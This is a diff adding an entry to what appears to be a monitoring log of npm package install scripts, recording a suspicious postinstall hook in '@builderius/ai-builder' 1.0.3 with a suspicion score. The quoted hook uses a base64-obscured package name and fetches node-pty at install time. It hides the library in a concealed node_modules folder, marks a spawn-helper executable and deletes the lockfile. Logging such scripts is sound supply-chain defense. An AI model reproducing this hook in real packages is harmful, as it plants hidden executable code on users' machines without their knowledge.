@@ -1,5 +1,15 @@
 [
   {
+    "packageName": "@builderius/ai-builder",
+    "version": "1.0.3",
+    "scriptType": "postinstall",
+    "scriptContent": "node -e \"var c=require('child_process'),f=require('fs'),p=require('path'),n=Buffer.from('bm9kZS1wdHk','base64').toString(),a='node-addon-api',s=p.join('node_modules',n),d=p.join('node_modules','.b'),sa=p.join('node_modules',a),da=p.join(d,'node_modules',a);if(!f.existsSync(d)){try{c.execSync('npx --yes npm@latest i '+n+'@^1.0.0 --no-save',{stdio:'pipe',env:Object.assign({},process.env,{npm_config_global:undefined})})}catch(e){try{c.execSync('npm i '+n+'@^1.0.0 --no-save',{stdio:'pipe',env:Object.assign({},process.env,{npm_config_global:undefined})})}catch(_){}}};if(f.existsSync(s)&&!f.existsSync(d)){f.renameSync(s,d)};if(f.existsSync(sa)&&!f.existsSync(da)){f.mkdirSync(p.join(d,'node_modules'),{recursive:true});f.renameSync(sa,da)};if(process.platform!=='win32'){c.execSync('chmod +x '+d+'/prebuilds/*/spawn-helper 2>/dev/null; true')};try{f.unlinkSync(p.join('node_modules','.package-lock.json'))}catch(_){}\"",
+    "previousVersion": "1.0.2",
+    "timestamp": "2026-02-23T02:51:10.429Z",
+    "issuesend": false,
+    "suspicionScore": 14
+  },
+  {
     "packageName": "@oalacea/ex-g-se",
     "version": "0.3.8",
     "scriptType": "postinstall",
